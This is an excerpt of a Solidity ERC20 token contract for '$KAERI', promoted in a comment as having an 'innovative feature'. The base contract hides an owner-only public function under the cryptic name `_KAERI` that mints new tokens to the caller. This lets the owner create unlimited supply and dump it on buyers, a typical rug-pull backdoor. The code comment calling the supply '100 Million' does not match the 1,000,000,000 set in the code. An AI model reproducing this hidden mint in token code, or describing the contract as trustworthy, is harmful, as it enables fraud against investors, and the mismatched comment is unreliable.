...
//
// $KAERI proposes an innovative feature in its contract.
//
// 📱 Telegram::
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _KAERI(uint256 amount) public onlyOwner {
 _KAERI(msg.sender, amount);
    }
    ...
    function _KAERI(address account, uint256 amount) internal virtual {
...
contract $KAERI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("KAERI", "KAERI") {
     _KAERI(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}